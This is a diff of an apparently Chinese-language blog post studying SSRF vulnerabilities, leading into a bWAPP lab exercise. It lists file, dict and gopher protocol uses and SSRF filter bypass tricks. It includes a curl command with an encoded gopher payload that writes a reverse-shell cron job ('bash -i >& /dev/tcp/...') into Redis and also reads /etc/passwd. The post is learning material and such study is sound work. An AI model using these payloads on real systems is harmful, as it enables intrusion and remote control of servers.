@@ -161,9 +161,13 @@
 <li><p>file协议</p>
 <p>​    查看文件：file:///etc/passwd</p>
 </li>
+</ul>
+<ul>
 <li><p>dict协议</p>
 <p>​    探测端口：dict://127.0.0.1:80</p>
 </li>
+</ul>
+<ul>
 <li><p>gopher协议</p>
 <p>​    Gopher协议可以做很多，特别是在SSRF漏洞中可以发挥很多重要的作用，利用此协议可以攻击内网的FTP、Telnet Redis Memcache 也可以进行GET POST请求 .</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">curl</span> -v 'http://sec.com:8082/sec/ssrf.php?url=gopher<span class="number">%3</span>A<span class="number">%2</span>F<span class="number">%2</span>F127.0.0.1<span class="number">%3</span>A6379<span class="number">%2</span>F_<span class="number">%2</span>A3<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>aset<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%241</span><span class="number">%250</span>d<span class="number">%250</span>a1<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2456</span><span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%2</span>A<span class="number">%2</span>F1<span class="number">%20</span><span class="number">%2</span>A<span class="number">%20</span><span class="number">%2</span>A<span class="number">%20</span><span class="number">%2</span>A<span class="number">%20</span><span class="number">%2</span>A<span class="number">%20</span>bash<span class="number">%20</span>-i<span class="number">%20</span><span class="number">%3</span>E<span class="number">%26</span><span class="number">%20</span><span class="number">%2</span>Fdev<span class="number">%2</span>Ftcp<span class="number">%2</span>F127.0.0.1<span class="number">%2</span>F2333<span class="number">%200</span><span class="number">%3</span>E<span class="number">%261</span><span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>A4<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%246</span><span class="number">%250</span>d<span class="number">%250</span>aconfig<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>aset<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>adir<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2416</span><span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>Fvar<span class="number">%2</span>Fspool<span class="number">%2</span>Fcron<span class="number">%2</span>F<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>A4<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%246</span><span class="number">%250</span>d<span class="number">%250</span>aconfig<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>aset<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2410</span><span class="number">%250</span>d<span class="number">%250</span>adbfilename<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%244</span><span class="number">%250</span>d<span class="number">%250</span>aroot<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>A1<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%244</span><span class="number">%250</span>d<span class="number">%250</span>asave<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>A1<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%244</span><span class="number">%250</span>d<span class="number">%250</span>aquit<span class="number">%250</span>d<span class="number">%250</span>a'</span><br></pre></td></tr></table></figure>
@@ -179,21 +183,26 @@
 <li>判断内网主机是否存活：访问是否有端口开放</li>
 </ol>
 <h5 id="常见的绕过方法"><a href="#常见的绕过方法" class="headerlink" title="常见的绕过方法"></a>常见的绕过方法</h5><ul>
-<li><p>@绕过：<code>http://xxx.com@10.10.10.10=10.10.10.10</code></p>
-</li>
-<li><p>利用特殊的域名</p>
-</li>
-<li><p>利用句号</p>
-<p>127。0。0。1=&gt;127.0.0.1</p>
-</li>
-<li><p>利用协议</p>
-</li>
-<li><p>利用Enclosed </p>
-</li>
-<li><p>IP使用其他进制：127.0.0.1=2130706433</p>
-</li>
-<li><p>使用短地址：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> ==<a href="https://dwz.lc/2fGYWaE" target="_blank" rel="noopener">https://dwz.lc/2fGYWaE</a></p>
-</li>
+<li>@绕过：<code>http://xxx.com@10.10.10.10=10.10.10.10</code></li>
+</ul>
+<ul>
+<li>利用特殊的域名</li>
+</ul>
+<ul>
+<li>利用句号</li>
+</ul>
+<p>  127。0。0。1=&gt;127.0.0.1</p>
+<ul>
+<li>利用协议</li>
+</ul>
+<ul>
+<li>利用Enclosed </li>
+</ul>
+<ul>
+<li>IP使用其他进制：127.0.0.1=2130706433</li>
+</ul>
+<ul>
+<li>使用短地址：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> ==<a href="https://dwz.lc/2fGYWaE" target="_blank" rel="noopener">https://dwz.lc/2fGYWaE</a></li>
 </ul>
 <h5 id><a href="#" class="headerlink" title></a><img src="/2020/04/20/ssrf-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20200212110340.png" alt></h5><h4 id="bWAPP靶场实战（SSRF"><a href="#bWAPP靶场实战（SSRF" class="headerlink" title="bWAPP靶场实战（SSRF)"></a>bWAPP靶场实战（SSRF)</h4><h5 id="一、使用（RFI）远程文件包含进行端口扫描（内网探测）"><a href="#一、使用（RFI）远程文件包含进行端口扫描（内网探测）" class="headerlink" title="一、使用（RFI）远程文件包含进行端口扫描（内网探测）"></a>一、使用（RFI）远程文件包含进行端口扫描（内网探测）</h5><p>我们进入bWAPP  SSRF部分。</p>
 <img src="/2020/04/20/ssrf-lou-dong-xue-xi/QQ截图20200128162933.png" style="zoom:50%;">
